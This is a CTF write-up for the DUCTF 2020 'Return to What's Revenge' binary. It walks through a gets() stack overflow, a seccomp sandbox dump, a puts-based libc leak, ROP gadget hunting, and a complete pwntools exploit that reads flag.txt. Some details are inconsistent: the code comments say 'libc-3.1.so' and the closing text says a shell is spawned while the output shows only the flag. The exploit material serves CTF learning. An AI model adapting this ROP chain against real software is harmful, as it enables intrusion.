+++
tags = ["Seccomp","ROP","CTF","Linux"]
date = "2021-08-17"
description = "DUCTF 2020 'return to whats revenge' challenge writeup."
featuredpath = "date"
linktitle = ""
title = "DUCTF 2020 :: Return to What's Revenge"
slug = "ductf-2020-return-to-whats-revenge"
type = "post"
+++

## Reverse Engineering

Running `file` tells us that the target binary is a 64-bit dynamically linked linux executable.

```
$ file ./return-to-whats-revenge 
./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped
```

We can run pwntools' `checksec` tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we'll likely have to build a ROP chain to bypass it.

```
$ checksec ./return-to-whats-revenge 
[*] './return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000) 
```

Running the binary shows us that it simply prompts the user for input prior to exiting. It's likely we'll find a vulnerability of some sort where it takes user input.

```
$ ./return-to-whats-revenge 
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
```

Disassembling the executable shows us that it contains two important functions. The `main` function calls a function called `vuln`. The `vuln` function makes a `gets` call with a stack variable, so we've found a stack buffer overflow.

```c
void vuln(void)
{
    char *s;
    
    puts("Where would you like to return to?");
    gets(&s);
    return;
}

undefined8 main(void)
{
    puts("Today, we\'ll have a lesson in returns.");
    vuln();
    return 0;
}
```

Running `strace` on the binary shows us that (at some point prior to taking user input) instantiates several `seccomp` rules, so not only will we have to build a ROP chain, we'll have to work within the `seccomp` jail.

```
$ strace ./return-to-whats-revenge

...

prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=25, filter=0x7fff935ea670}) = 0

...
```

We can use a wonderful tool called `seccomp-tools` to dump the `seccomp` rules that the binary operates under. Note that the binary allows the `open`, `read`, and `write` syscalls - so we should be able to build a ROP chain that opens, reads, and writes the flag to `stdout`. 

```
$ seccomp-tools dump ./return-to-whats-revenge 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

Let's use `readelf` to get the address of the binary's `.data` section, we'll want to use it to store our `flag.txt` string that we use in the `open` syscall of our ROP chain.

```
$ readelf --sections ./return-to-whats-revenge

..

   [22] .data             PROGBITS         0000000000404000  00003000
       0000000000000010  0000000000000000  WA 

...
```

Earlier we noticed that the binary uses `puts`, we can use this to perform a simple `puts(puts)` style leak to obtain the an address in `libc`. Let's find the offset of `puts` from the base of `libc`. We'll want to use this later to find the base address of `libc`.

```
pwndbg> info proc map
process 1461
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
...
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg> p puts
$2 = {int (const char *)} 0x7ffff7e655f0 <__GI__IO_puts>
pwndbg> p/x 0x7ffff7e655f0-0x7ffff7def000
$3 = 0x765f0
```

Lastly, we just need to find a bunch of different ROP gadgets in order to perform our exploit. These are mostly just `pop reg; ret` instructions that we can use to move values into the registers we need to perform syscalls, and a `syscall` instruction that'll allow us to execute our `open`, `read`, and `write` syscalls.

```
$ ropper --file ./return-to-whats-revenge --search 'pop rdi'         
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./return-to-whats-revenge
0x00000000004019db: pop rdi; ret;
```

```
$ ropper --file ./return-to-whats-revenge --search 'pop rsi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: ./return-to-whats-revenge
0x00000000004019d9: pop rsi; pop r15; ret;
```

```
$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rdx'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx

[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000cb1cd: pop rdx; ret;
```

```
$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rax'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax

[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x000000000003ee88: pop rax; ret;
...
```

```
$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'syscall'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall

[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000580da: syscall; ret;
```


## Information Gathering

The only bit of information we now need to gather is the offset of the return address from our input buffer.

Here's a quick script that'll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address from our input buffer.

```py
#!/usr/bin/env python3

from pwn import *


r = process('./return-to-whats-revenge')
gdb.attach(r)

r.clean()
r.writeline(cyclic(300, n=8))

r.interactive()
```

After continuing in GDB and letting the program crash, we can see what was stored in the return address.

```
 ► 0x4011d9 <vuln+39>    ret    <0x6161616161616168>
```

We can use pwntools' `cyclic_find` function to calculate the offset of the return address from the start of our input buffer (using the value stored in the return address we found above).

```py
In [2]: cyclic_find(0x6161616161616168, n=8)
Out[2]: 56
```


## Exploit Development

Now that we have everything we need, we can start to write our exploit. There's a lot of things we'll need to achieve (leaks, etc), so here's a brief summary of what we want to do:
 * Overwrite the return address to gain control of process execution.
 * Perform a `puts(puts)` leak to obtain an address in `libc`. 
 * Calculate the base address of `libc`.
 * Return back to `main` so we can perform the second stage of our exploit.
 * Build a ROP chain that opens, reads, and writes the contents of `flag.txt`.

```py
#!/usr/bin/env python3

import time
from pwn import *

context.clear(arch='amd64')


pad = b'A' * 56 


'''
return-to-whats-revenge
0x00000000004019db: pop rdi; ret;
'''
pop_rdi = 0x4019db

'''
return-to-whats-revenge
0x00000000004019d9: pop rsi; pop r15; ret;
'''
pop_rsi = 0x4019d9

'''
libc-3.1.so
0x00000000000cb1cd: pop rdx; ret;
'''
pop_rdx = 0x0cb1cd

'''
libc-3.1.so
0x000000000003ee88: pop rax; ret;
'''
pop_rax = 0x03ee88

'''
libc-3.1.so
0x00000000000580da: syscall; ret;
'''
syscall = 0x0580da


r = process('./return-to-whats-revenge')


elf = ELF('./return-to-whats-revenge')


rop = ROP(elf)

rop.raw(pop_rdi)
rop.raw(elf.got['puts']) # pop rdi ; got.puts
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['main'])


r.clean()
r.writeline(pad + rop.chain())

leak = r.readline()[:-1]
leak = unpack(leak, len(leak) * 8)
libc = leak - 0x765f0


rop = flat(
    # read(.data, stdin, 9)
    pop_rdi, 0, pop_rsi, 0x404000, 0, libc+pop_rdx, 9, libc+pop_rax, 0, libc+syscall,
    
    # open("flag.txt", 0, 0)
    pop_rdi, 0x404000, pop_rsi, 0, 0, libc+pop_rdx, 0, libc+pop_rax, 2, libc+syscall,
    
    # read(3, .data+0x10, 35)
    pop_rdi, 3, pop_rsi, 0x404010, 0, libc+pop_rdx, 35, libc+pop_rax, 0, libc+syscall,

    # write(stdout, .data+0x10, 35)
    pop_rdi, 1, pop_rsi, 0x404010, 0, libc+pop_rdx, 35, libc+pop_rax, 1, libc+syscall,

    # exit(0)
    pop_rdi, 0, libc+pop_rax, 60, libc+syscall
)

r.writeline(pad + rop)
r.writeline(b'flag.txt\x00')

r.readuntil('Where would you like to return to?\n')

print(r.readall())
r.close()
```

And finally, here's our exploit in action. It spawns an interactive shell that we can use to retrieve the flag.

```
$ ./exploit.py 
[+] Starting local process './return-to-whats-revenge': pid 2683
[*] './return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-whats-revenge'
Today, we'll have a lesson in returns.
Where would you like to return to?
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
[*] Stopped process './return-to-whats-revenge' (pid 2683)
```
